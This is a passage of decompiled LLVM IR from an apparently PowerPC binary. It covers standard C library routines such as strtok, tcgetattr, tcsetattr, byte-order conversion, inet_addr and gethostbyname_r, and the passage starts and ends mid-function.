  %v3_1000522c = load i32, i32* bitcast (i32** @global_var_1001d820.381 to i32*), align 4
  %v0_10005234.pre = load i32, i32* @r3, align 4
  %v1_10005234.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10005234

dec_label_pc_10005234:                            ; preds = %dec_label_pc_1000525c, %entry
  %v0_100052706 = phi i32 [ %v0_100052707, %dec_label_pc_1000525c ], [ 0, %entry ]
  %v0_10005260 = phi i32 [ %v1_10005260, %dec_label_pc_1000525c ], [ %v1_10005234.pre, %entry ]
  %v0_10005264 = phi i32 [ %v1_10005264, %dec_label_pc_1000525c ], [ %v0_10005234.pre, %entry ]
  %v4_10005234 = icmp eq i32 %v0_10005264, %v0_10005260
  %.pre = inttoptr i32 %v0_10005264 to i8*
  br i1 %v4_10005234, label %dec_label_pc_1000525c, label %dec_label_pc_1000523c

dec_label_pc_1000523c:                            ; preds = %dec_label_pc_10005234
  %v2_1000523c = load i8, i8* %.pre, align 1
  %v3_1000523c = zext i8 %v2_1000523c to i32
  %v1_10005240 = inttoptr i32 %v0_10005260 to i8*
  %v2_10005240 = load i8, i8* %v1_10005240, align 1
  %v3_10005240 = zext i8 %v2_10005240 to i32
  %v1_10005244 = mul nuw nsw i32 %v3_1000523c, 2
  %v1_10005248 = mul nuw nsw i32 %v3_10005240, 2
  %v2_1000524c = add i32 %v1_10005244, %v3_1000522c
  %v3_1000524c = inttoptr i32 %v2_1000524c to i16*
  %v4_1000524c = load i16, i16* %v3_1000524c, align 2
  %v5_1000524c = sext i16 %v4_1000524c to i32
  %v2_10005250 = add i32 %v1_10005248, %v3_1000522c
  %v3_10005250 = inttoptr i32 %v2_10005250 to i16*
  %v4_10005250 = load i16, i16* %v3_10005250, align 2
  %v5_10005250 = sext i16 %v4_10005250 to i32
  %v2_10005254 = sub nsw i32 %v5_1000524c, %v5_10005250
  %v4_10005258 = icmp eq i16 %v4_1000524c, %v4_10005250
  br i1 %v4_10005258, label %dec_label_pc_1000525c, label %dec_label_pc_10005270

dec_label_pc_1000525c:                            ; preds = %dec_label_pc_10005234, %dec_label_pc_1000523c
  %v0_100052707 = phi i32 [ %v2_10005254, %dec_label_pc_1000523c ], [ %v0_100052706, %dec_label_pc_10005234 ]
  %v2_1000525c = load i8, i8* %.pre, align 1
  %v1_10005260 = add i32 %v0_10005260, 1
  %v1_10005264 = add i32 %v0_10005264, 1
  %v3_10005268 = icmp eq i8 %v2_1000525c, 0
  br i1 %v3_10005268, label %dec_label_pc_10005270, label %dec_label_pc_10005234

dec_label_pc_10005270:                            ; preds = %dec_label_pc_1000525c, %dec_label_pc_1000523c
  %v0_10005270 = phi i32 [ %v0_100052707, %dec_label_pc_1000525c ], [ %v2_10005254, %dec_label_pc_1000523c ]
  ret i32 %v0_10005270

; uselistorder directives
  uselistorder i32 %v2_10005254, { 1, 0 }
  uselistorder i32 %v0_10005264, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000525c, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_1001d86c.382 to i32), i32* @r5, align 4
  %v1_10005280 = call i32 @strtok_r(i32 ptrtoint (i32* @global_var_1001d86c.382 to i32))
  ret i32 %v1_10005280
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-72 = alloca i32, align 4
  store i32 268456600, i32* @lr, align 4
  %v2_10005294 = call i32 @__GI_tcgetattr(i32* nonnull %stack_var_-72)
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32*)* @__GI_tcgetattr, { 1, 0 }
}

define i32 @__GI_tcgetattr(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8 @__decompiler_undefined_function_3()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_100052b4 = load i32, i32* @lr, align 4
  store i32 %v0_100052b4, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_100052c4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268456664, i32* @lr, align 4
  %v3_100052d4 = call i32 @ioctl(i32 1076655123, i32 %v2_100052c4, i32 %v2_100052c4)
  %v2_100052d8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100052d8, i32* @r4, align 4
  store i32 %v3_100052d4, i32* @r30, align 4
  %v3_100052dc = icmp eq i32 %v3_100052d4, 0
  store i32 19, i32* @r5, align 4
  %v0_100052e4 = load i32, i32* @r31, align 4
  br i1 %v3_100052dc, label %dec_label_pc_100052ec, label %dec_label_pc_10005334

dec_label_pc_100052ec:                            ; preds = %entry
  %v1_100052e4 = add i32 %v0_100052e4, 17
  %v3_10005304 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_10005304, i32* %r0.global-to-local, align 4
  %v2_10005308 = add i32 %v0_100052e4, 4
  %v3_10005308 = inttoptr i32 %v2_10005308 to i32*
  store i32 %tmp7, i32* %v3_10005308, align 4
  %v0_1000530c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000530c = load i32, i32* @r31, align 4
  %v2_1000530c = add i32 %v1_1000530c, 8
  %v3_1000530c = inttoptr i32 %v2_1000530c to i32*
  store i32 %v0_1000530c, i32* %v3_1000530c, align 4
  %v0_10005310 = load i32, i32* %r0.global-to-local, align 4
  %v1_10005310 = load i32, i32* @r31, align 4
  %v2_10005310 = inttoptr i32 %v1_10005310 to i32*
  store i32 %v0_10005310, i32* %v2_10005310, align 4
  %v0_10005314 = load i32, i32* %r10.global-to-local, align 4
  %v1_10005314 = load i32, i32* @r31, align 4
  %v2_10005314 = add i32 %v1_10005314, 12
  %v3_10005314 = inttoptr i32 %v2_10005314 to i32*
  store i32 %v0_10005314, i32* %v3_10005314, align 4
  %v3_10005318 = load i32, i32* @r31, align 4
  %v4_10005318 = add i32 %v3_10005318, 16
  %v5_10005318 = inttoptr i32 %v4_10005318 to i8*
  store i8 %tmp4, i8* %v5_10005318, align 1
  %v1_1000531c = load i32, i32* @r31, align 4
  %v2_1000531c = add i32 %v1_1000531c, 52
  %v3_1000531c = inttoptr i32 %v2_1000531c to i32*
  store i32 %tmp3, i32* %v3_1000531c, align 4
  %v1_10005320 = load i32, i32* @r31, align 4
  %v2_10005320 = add i32 %v1_10005320, 56
  %v3_10005320 = inttoptr i32 %v2_10005320 to i32*
  store i32 %tmp2, i32* %v3_10005320, align 4
  store i32 268456744, i32* @lr, align 4
  %v6_10005324 = sext i8 %tmp4 to i32
  %v8_10005324 = call i32 @__GI_mempcpy(i32 %v1_100052e4, i32 %v2_100052d8, i32 19, i32 %tmp2, i32 %tmp3, i32 %v6_10005324, i32 %tmp7)
  store i32 268456756, i32* @lr, align 4
  %v3_10005330 = call i32 @__GI_memset(i32 %v8_10005324, i32 0, i32 13)
  %v0_10005338.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10005334

dec_label_pc_10005334:                            ; preds = %entry, %dec_label_pc_100052ec
  %v0_10005338 = phi i32 [ %v3_100052d4, %entry ], [ %v0_10005338.pre, %dec_label_pc_100052ec ]
  store i32 %v0_100052b4, i32* %r0.global-to-local, align 4
  ret i32 %v0_10005338

; uselistorder directives
  uselistorder i32 %v2_100052c4, { 1, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32 13, { 1, 0 }
  uselistorder label %dec_label_pc_10005334, { 1, 0 }
}

define i32 @__GI_tcsetattr() local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_10005354 = load i32, i32* @r4, align 4
  %v3_10005354 = icmp eq i32 %v0_10005354, 1
  %v0_1000535c = load i32, i32* @r3, align 4
  store i32 %v0_1000535c, i32* @r27, align 4
  %v0_10005364 = load i32, i32* @r5, align 4
  store i32 %v0_10005364, i32* @r31, align 4
  br i1 %v3_10005354, label %dec_label_pc_10005388, label %dec_label_pc_1000536c

dec_label_pc_1000536c:                            ; preds = %entry
  %v3_1000536c = icmp eq i32 %v0_10005354, 2
  br i1 %v3_1000536c, label %dec_label_pc_100053a8, label %dec_label_pc_10005374

dec_label_pc_10005374:                            ; preds = %dec_label_pc_1000536c
  %v3_10005374 = icmp eq i32 %v0_10005354, 0
  store i32 -2144570348, i32* @r30, align 4
  br i1 %v3_10005374, label %dec_label_pc_100053b0, label %dec_label_pc_10005394

dec_label_pc_10005388:                            ; preds = %entry
  store i32 -2144570347, i32* @r30, align 4
  br label %dec_label_pc_100053b0

dec_label_pc_10005394:                            ; preds = %dec_label_pc_10005374
  %v0_10005394 = call i32 @__errno_location()
  store i32 -1, i32* @r28, align 4
  %v2_100053a0 = inttoptr i32 %v0_10005394 to i32*
  store i32 22, i32* %v2_100053a0, align 4
  br label %dec_label_pc_10005498

dec_label_pc_100053a8:                            ; preds = %dec_label_pc_1000536c
  store i32 -2144570346, i32* @r30, align 4
  br label %dec_label_pc_100053b0

dec_label_pc_100053b0:                            ; preds = %dec_label_pc_10005374, %dec_label_pc_10005388, %dec_label_pc_100053a8
  %v1_100053b0 = inttoptr i32 %v0_10005364 to i32*
  %v2_100053b0 = load i32, i32* %v1_100053b0, align 4
  store i32 19, i32* @r5, align 4
  %v1_100053b8 = add i32 %v0_10005364, 4
  %v2_100053b8 = inttoptr i32 %v1_100053b8 to i32*
  %v3_100053b8 = load i32, i32* %v2_100053b8, align 4
  store i32 %v3_100053b8, i32* %r9.global-to-local, align 4
  %v1_100053bc = add i32 %v0_10005364, 17
  store i32 %v1_100053bc, i32* @r4, align 4
  %v1_100053c0 = add i32 %v0_10005364, 8
  %v2_100053c0 = inttoptr i32 %v1_100053c0 to i32*
  %v3_100053c0 = load i32, i32* %v2_100053c0, align 4
  %v2_100053c4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_100053c4, i32* @r3, align 4
  %v2_100053cc = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_100053cc, i32* @r26, align 4
  store i32 %v2_100053b0, i32* %stack_var_-72, align 4
  store i32 268456956, i32* @lr, align 4
  %v0_100053f8 = call i32 @memcpy()
  %v0_100053fc = load i32, i32* @r27, align 4
  %v0_10005400 = load i32, i32* @r30, align 4
  store i32 268456976, i32* @lr, align 4
  %v3_1000540c = call i32 @ioctl(i32 %v0_100053fc, i32 %v0_10005400, i32 %v2_100053cc)
  store i32 %v3_1000540c, i32* @r28, align 4
  %v3_10005410 = icmp eq i32 %v3_1000540c, 0
  br i1 %v3_10005410, label %dec_label_pc_10005418, label %dec_label_pc_10005498

dec_label_pc_10005418:                            ; preds = %dec_label_pc_100053b0
  %v0_10005418 = load i32, i32* @r30, align 4
  %v3_1000541c = icmp eq i32 %v0_10005418, -2144570348
  br i1 %v3_1000541c, label %dec_label_pc_10005424, label %dec_label_pc_10005494

dec_label_pc_10005424:                            ; preds = %dec_label_pc_10005418
  %v0_10005424 = call i32 @__errno_location()
  store i32 %v0_10005424, i32* @r29, align 4
  %v0_10005434 = load i32, i32* @r27, align 4
  %v1_1000543c = inttoptr i32 %v0_10005424 to i32*
  %v2_1000543c = load i32, i32* %v1_1000543c, align 4
  store i32 %v2_1000543c, i32* @r30, align 4
  store i32 268457032, i32* @lr, align 4
  %v3_10005444 = call i32 @ioctl(i32 %v0_10005434, i32 1076655123, i32 %v2_100053cc)
  %v3_10005448 = icmp eq i32 %v3_10005444, 0
  br i1 %v3_10005448, label %dec_label_pc_10005458, label %dec_label_pc_10005450

dec_label_pc_10005450:                            ; preds = %dec_label_pc_10005424
  %v0_10005450 = load i32, i32* @r30, align 4
  %v1_10005450 = load i32, i32* @r29, align 4
  %v2_10005450 = inttoptr i32 %v1_10005450 to i32*
  store i32 %v0_10005450, i32* %v2_10005450, align 4
  br label %dec_label_pc_10005498

dec_label_pc_10005458:                            ; preds = %dec_label_pc_10005424
  %v0_10005458 = load i32, i32* @r31, align 4
  %v1_10005458 = add i32 %v0_10005458, 8
  %v2_10005458 = inttoptr i32 %v1_10005458 to i32*
  %v3_10005458 = load i32, i32* %v2_10005458, align 4
  %v1_10005460 = call i32 @__asm_rlwinm(i32 %v3_10005458, i32 0, i32 19, i32 20)
  %v1_10005464 = call i32 @__asm_rlwinm(i32 %v3_100053c0, i32 0, i32 19, i32 20)
  store i32 %v1_10005464, i32* %r9.global-to-local, align 4
  %v4_10005468 = icmp eq i32 %v1_10005460, %v1_10005464
  br i1 %v4_10005468, label %dec_label_pc_10005470, label %dec_label_pc_10005484

dec_label_pc_10005470:                            ; preds = %dec_label_pc_10005458
  %v1_10005470 = and i32 %v3_10005458, 768
  store i32 %v1_10005470, i32* %r9.global-to-local, align 4
  %v3_10005470 = icmp eq i32 %v1_10005470, 0
  br i1 %v3_10005470, label %dec_label_pc_10005494, label %dec_label_pc_10005478

dec_label_pc_10005478:                            ; preds = %dec_label_pc_10005470
  %v1_10005478 = call i32 @__asm_rlwinm(i32 %v3_100053c0, i32 0, i32 22, i32 23)
  %v0_1000547c = load i32, i32* %r9.global-to-local, align 4
  %v4_1000547c = icmp eq i32 %v0_1000547c, %v1_10005478
  br i1 %v4_1000547c, label %dec_label_pc_10005494, label %dec_label_pc_10005484

dec_label_pc_10005484:                            ; preds = %dec_label_pc_10005458, %dec_label_pc_10005478
  store i32 -1, i32* @r28, align 4
  %v1_1000548c = load i32, i32* @r29, align 4
  %v2_1000548c = inttoptr i32 %v1_1000548c to i32*
  store i32 22, i32* %v2_1000548c, align 4
  br label %dec_label_pc_10005498

dec_label_pc_10005494:                            ; preds = %dec_label_pc_10005418, %dec_label_pc_10005478, %dec_label_pc_10005470
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10005498

dec_label_pc_10005498:                            ; preds = %dec_label_pc_100053b0, %dec_label_pc_10005450, %dec_label_pc_10005394, %dec_label_pc_10005484, %dec_label_pc_10005494
  %v0_1000549c = load i32, i32* @r28, align 4
  ret i32 %v0_1000549c

; uselistorder directives
  uselistorder i32 %v0_10005364, { 1, 0, 3, 2, 4 }
  uselistorder i32* %r9.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0, 4, 3 }
  uselistorder i32 19, { 3, 4, 5, 0, 6, 1, 2 }
  uselistorder label %dec_label_pc_10005498, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_10005494, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10005484, { 1, 0 }
  uselistorder label %dec_label_pc_100053b0, { 2, 1, 0 }
}

define i32 @ntohl() local_unnamed_addr {
entry:
  %v0_100054b0 = load i32, i32* @r3, align 4
  ret i32 %v0_100054b0
}

define i32 @ntohs() local_unnamed_addr {
entry:
  %v0_100054b4 = load i32, i32* @r3, align 4
  ret i32 %v0_100054b4
}

define i32 @htonl() local_unnamed_addr {
entry:
  %v0_100054b8 = load i32, i32* @r3, align 4
  ret i32 %v0_100054b8
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v0_100054bc = load i32, i32* @r3, align 4
  ret i32 %v0_100054bc
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_100054c8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_100054c8, i32* @r4, align 4
  store i32 268457172, i32* @lr, align 4
  %v1_100054d0 = bitcast i32* %stack_var_-24 to i8*
  %v2_100054d0 = call i32 @inet_aton(i8* %v1_100054d0)
  %v3_100054d4 = icmp eq i32 %v2_100054d0, 0
  br i1 %v3_100054d4, label %dec_label_pc_100054e4, label %dec_label_pc_100054e0

dec_label_pc_100054e0:                            ; preds = %entry
  %v3_100054e0 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_100054e4

dec_label_pc_100054e4:                            ; preds = %entry, %dec_label_pc_100054e0
  %v0_100054f0 = phi i32 [ -1, %entry ], [ %v3_100054e0, %dec_label_pc_100054e0 ]
  ret i32 %v0_100054f0

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100054e4, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_10005508 = call i32 @__GI___h_errno_location()
  %v2_10005518 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268457264, i32* @lr, align 4
  %v7_1000552c = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_1001fe98.383, i32 ptrtoint (i32* @global_var_1001fccc.384 to i32), i32 460, i32 %v2_10005518, i32 %v0_10005508)
  %v3_10005534 = load i32, i32* %stack_var_-40, align 4
  ret i32 %v3_10005534
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %v0_1000554c = load i32, i32* @lr, align 4
  store i32 %v0_1000554c, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r23, align 4
  %v3_10005554 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r31, align 4
  store i32 %arg5, i32* %r20.global-to-local, align 4
  store i32 %tmp, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* %r29.global-to-local, align 4
  store i32 %arg6, i32* @r24, align 4
  %v2_10005574 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_10005574, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  br i1 %v3_10005554, label %dec_label_pc_10005878, label %dec_label_pc_10005580

dec_label_pc_10005580:                            ; preds = %entry
  %v0_10005580 = call i32 @__errno_location()
  store i32 %v0_10005580, i32* %r3.global-to-local, align 4
  %v1_10005588 = inttoptr i32 %v0_10005580 to i32*
  %v2_10005588 = load i32, i32* %v1_10005588, align 4
  store i32 %v2_10005588, i32* @r27, align 4
  store i32 %v0_10005580, i32* %r28.global-to-local, align 4
  %v0_10005590 = load i32, i32* @r31, align 4
  store i32 %v0_10005590, i32* %v1_10005588, align 4
  %v0_10005594 = load i32, i32* %r26.global-to-local, align 4
  %v0_10005598 = load i32, i32* @r23, align 4
  store i32 %v0_10005598, i32* %r3.global-to-local, align 4
  %v0_1000559c = load i32, i32* %r30.global-to-local, align 4
  %v0_100055a0 = load i32, i32* %r29.global-to-local, align 4
  %v0_100055a4 = load i32, i32* %r20.global-to-local, align 4
  %v0_100055a8 = load i32, i32* @r24, align 4
  store i32 268457392, i32* @lr, align 4
  %v7_100055ac = call i32 @__get_hosts_byname_r(i32 %v0_10005598, i32 2, i32 %v0_10005594, i32 %v0_1000559c, i32 %v0_100055a0, i32 %v0_100055a4, i32 %v0_100055a8)
  store i32 %v7_100055ac, i32* %r3.global-to-local, align 4
  %v3_100055b0 = icmp eq i32 %v7_100055ac, 0
  br i1 %v3_100055b0, label %dec_label_pc_10005878, label %dec_label_pc_100055b8

dec_label_pc_100055b8:                            ; preds = %dec_label_pc_10005580
  %v0_100055b8 = load i32, i32* @r24, align 4
  %v1_100055b8 = inttoptr i32 %v0_100055b8 to i32*
  %v2_100055b8 = load i32, i32* %v1_100055b8, align 4
  store i32 %v2_100055b8, i32* %r0.global-to-local, align 4
  %v3_100055bc = icmp eq i32 %v2_100055b8, 1
  br i1 %v3_100055bc, label %dec_label_pc_100055e0, label %dec_label_pc_100055c4

dec_label_pc_100055c4:                            ; preds = %dec_label_pc_100055b8
  %v3_100055c4 = icmp eq i32 %v2_100055b8, 4
  br i1 %v3_100055c4, label %dec_label_pc_100055e0, label %dec_label_pc_100055cc

dec_label_pc_100055cc:                            ; preds = %dec_label_pc_100055c4
  %v3_100055cc = icmp eq i32 %v2_100055b8, -1
  br i1 %v3_100055cc, label %dec_label_pc_100055d4, label %dec_label_pc_10005878

dec_label_pc_100055d4:                            ; preds = %dec_label_pc_100055cc
  %v0_100055d4 = load i32, i32* @r28, align 4
  %v1_100055d4 = inttoptr i32 %v0_100055d4 to i32*
  %v2_100055d4 = load i32, i32* %v1_100055d4, align 4
  store i32 %v2_100055d4, i32* %r0.global-to-local, align 4
  %v3_100055d8 = icmp eq i32 %v2_100055d4, 2
  br i1 %v3_100055d8, label %dec_label_pc_100055e0, label %dec_label_pc_10005878

dec_label_pc_100055e0:                            ; preds = %dec_label_pc_100055d4, %dec_label_pc_100055c4, %dec_label_pc_100055b8
  %v0_100055e0 = load i32, i32* @r30, align 4
  %v1_100055e0 = sub i32 0, %v0_100055e0
  store i32 %v1_100055e0, i32* %r0.global-to-local, align 4
  %v0_100055e4 = load i32, i32* @r27, align 4
  %v1_100055e4 = load i32, i32* @r28, align 4
  %v2_100055e4 = inttoptr i32 %v1_100055e4 to i32*
  store i32 %v0_100055e4, i32* %v2_100055e4, align 4
  %v0_100055e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100055e8 = urem i32 %v0_100055e8, 4
  store i32 %v1_100055e8, i32* %r0.global-to-local, align 4
  %v3_100055e8 = icmp eq i32 %v1_100055e8, 0
  %v0_10005600.pre = load i32, i32* @r29, align 4
  br i1 %v3_100055e8, label %dec_label_pc_10005600, label %dec_label_pc_100055f0

dec_label_pc_100055f0:                            ; preds = %dec_label_pc_100055e0
  %v2_100055f0 = icmp ult i32 %v0_10005600.pre, %v1_100055e8
  br i1 %v2_100055f0, label %dec_label_pc_10005874, label %dec_label_pc_100055f8

dec_label_pc_100055f8:                            ; preds = %dec_label_pc_100055f0
  %v2_100055f8 = sub i32 %v0_10005600.pre, %v1_100055e8
  store i32 %v2_100055f8, i32* @r29, align 4
  %v0_100055fc = load i32, i32* @r30, align 4
  %v2_100055fc = add i32 %v0_100055fc, %v1_100055e8
  store i32 %v2_100055fc, i32* @r30, align 4
  br label %dec_label_pc_10005600

dec_label_pc_10005600:                            ; preds = %dec_label_pc_100055e0, %dec_label_pc_100055f8
  %v0_10005600 = phi i32 [ %v2_100055f8, %dec_label_pc_100055f8 ], [ %v0_10005600.pre, %dec_label_pc_100055e0 ]
  %v1_10005608 = load i32, i32* @r24, align 4
  %v2_10005608 = inttoptr i32 %v1_10005608 to i32*
  store i32 -1, i32* %v2_10005608, align 4
  %tmp29 = icmp ult i32 %v0_10005600, 4
  br i1 %tmp29, label %dec_label_pc_10005874, label %dec_label_pc_10005610

dec_label_pc_10005610:                            ; preds = %dec_label_pc_10005600
  %v0_10005610 = load i32, i32* @r29, align 4
  %v1_10005610 = add i32 %v0_10005610, -4
  store i32 %v1_10005610, i32* %r0.global-to-local, align 4
  %tmp30 = icmp ult i32 %v1_10005610, 8
  br i1 %tmp30, label %dec_label_pc_10005874, label %dec_label_pc_1000561c

dec_label_pc_1000561c:                            ; preds = %dec_label_pc_10005610
  %v1_1000561c = add i32 %v0_10005610, -12
  store i32 %v1_1000561c, i32* %r0.global-to-local, align 4
  %v0_10005620 = load i32, i32* @r30, align 4
  %v1_10005620 = add i32 %v0_10005620, 4
  store i32 %v1_10005620, i32* %r25.global-to-local, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  %v3_1000562c = inttoptr i32 %v1_10005620 to i32*
  store i32 %v0_10005620, i32* %v3_1000562c, align 4
  %v0_10005630 = load i32, i32* %r28.global-to-local, align 4
  %v1_10005630 = load i32, i32* %r25.global-to-local, align 4
  %v2_10005630 = add i32 %v1_10005630, 4
  %v3_10005630 = inttoptr i32 %v2_10005630 to i32*
  store i32 %v0_10005630, i32* %v3_10005630, align 4
  %tmp31 = icmp ult i32 %v1_1000561c, 32
  br i1 %tmp31, label %dec_label_pc_10005874, label %dec_label_pc_10005638

dec_label_pc_10005638:                            ; preds = %dec_label_pc_1000561c
  %v0_10005638 = load i32, i32* @r29, align 4
  %v1_10005638 = add i32 %v0_10005638, -44
  %tmp32 = icmp ult i32 %v1_10005638, 256
  br i1 %tmp32, label %dec_label_pc_10005874, label %dec_label_pc_10005644

dec_label_pc_10005644:                            ; preds = %dec_label_pc_10005638
  %v0_10005644 = load i32, i32* @r30, align 4
  %v1_10005644 = add i32 %v0_10005644, 44
  store i32 %v1_10005644, i32* @r31, align 4
  %v0_10005648 = load i32, i32* @r23, align 4
  store i32 %v0_10005648, i32* @r4, align 4
  %v1_10005650 = add i32 %v0_10005644, 12
  store i32 %v1_10005650, i32* %r21.global-to-local, align 4
  store i32 %v1_10005644, i32* %r3.global-to-local, align 4
  store i32 268457564, i32* @lr, align 4
  %v3_10005658 = call i32 @strncpy(i32 %v1_10005644, i32 %v0_10005648, i32 %v1_10005638)
  %v0_1000565c = load i32, i32* @r31, align 4
  %v1_1000565c = load i32, i32* @r30, align 4
  %v2_1000565c = add i32 %v1_1000565c, 12
  %v3_1000565c = inttoptr i32 %v2_1000565c to i32*
  store i32 %v0_1000565c, i32* %v3_1000565c, align 4
  %v0_10005660 = load i32, i32* %r28.global-to-local, align 4
  %v1_10005660 = load i32, i32* %r21.global-to-local, align 4
  %v2_10005660 = add i32 %v1_10005660, 4
  %v3_10005660 = inttoptr i32 %v2_10005660 to i32*
  store i32 %v0_10005660, i32* %v3_10005660, align 4
  %v0_10005664 = load i32, i32* @r23, align 4
  store i32 %v0_10005664, i32* %r3.global-to-local, align 4
  %v0_10005668 = load i32, i32* @r30, align 4
  store i32 %v0_10005668, i32* @r4, align 4
  store i32 268457584, i32* @lr, align 4
  %v2_1000566c = inttoptr i32 %v0_10005664 to i8*
  %v3_1000566c = call i32 @inet_aton(i8* %v2_1000566c)
  store i32 %v3_1000566c, i32* %r3.global-to-local, align 4
  store i32 %v3_1000566c, i32* %r22.global-to-local, align 4
  %v3_10005670 = icmp eq i32 %v3_1000566c, 0
  br i1 %v3_10005670, label %dec_label_pc_100056a4, label %dec_label_pc_10005678

dec_label_pc_10005678:                            ; preds = %dec_label_pc_10005644
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10005680 = load i32, i32* @r26, align 4
  %v2_10005680 = add i32 %v1_10005680, 8
  %v3_10005680 = inttoptr i32 %v2_10005680 to i32*
  store i32 2, i32* %v3_10005680, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_10005688 = load i32, i32* @r31, align 4
  %v1_10005688 = load i32, i32* @r26, align 4
  %v2_10005688 = inttoptr i32 %v1_10005688 to i32*
  store i32 %v0_10005688, i32* %v2_10005688, align 4
  %v0_1000568c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000568c = load i32, i32* @r26, align 4
  %v2_1000568c = add i32 %v1_1000568c, 12
  %v3_1000568c = inttoptr i32 %v2_1000568c to i32*
  store i32 %v0_1000568c, i32* %v3_1000568c, align 4
  %v0_10005690 = load i32, i32* %r25.global-to-local, align 4
  %v1_10005690 = load i32, i32* @r26, align 4
  %v2_10005690 = add i32 %v1_10005690, 16
  %v3_10005690 = inttoptr i32 %v2_10005690 to i32*
  store i32 %v0_10005690, i32* %v3_10005690, align 4
  %v0_10005694 = load i32, i32* %r21.global-to-local, align 4
  %v1_10005694 = load i32, i32* @r26, align 4
  %v2_10005694 = add i32 %v1_10005694, 4
  %v3_10005694 = inttoptr i32 %v2_10005694 to i32*
  store i32 %v0_10005694, i32* %v3_10005694, align 4
  %v0_10005698 = load i32, i32* @r26, align 4
  %v1_10005698 = load i32, i32* @r20, align 4
  %v2_10005698 = inttoptr i32 %v1_10005698 to i32*
  store i32 %v0_10005698, i32* %v2_10005698, align 4
  %v0_1000569c = load i32, i32* %r28.global-to-local, align 4
  %v1_1000569c = load i32, i32* @r24, align 4
  %v2_1000569c = inttoptr i32 %v1_1000569c to i32*
  store i32 %v0_1000569c, i32* %v2_1000569c, align 4
  br label %dec_label_pc_10005878

dec_label_pc_100056a4:                            ; preds = %dec_label_pc_10005644
  store i32 268566528, i32* %r29.global-to-local, align 4
  store i32 268457644, i32* @lr, align 4
  %v0_100056a8 = call i32 @__open_nameservers()
  store i32 ptrtoint (i32* @global_var_1001d7a8.385 to i32), i32* %r29.global-to-local, align 4
  %v2_100056b0 = ptrtoint i32* %stack_var_-116 to i32
  store i32 %v2_100056b0, i32* %r28.global-to-local, align 4
  store i32 %v2_100056b0, i32* @r3, align 4
  %v0_100056c4 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_1001d7a8.385 to i32), i32* %r3.global-to-local, align 4
  %v0_100056cc = call i32 @__pthread_return_0()
  %v3_100056d4 = load i32, i32* @global_var_1001d898.386, align 4
  store i32 %v3_100056d4, i32* %r29.global-to-local, align 4
  store i32 %v2_100056b0, i32* @r3, align 4
  %v0_100056e0 = call i32 @__pthread_return_void()
  %v0_100056e8 = load i32, i32* @r23, align 4
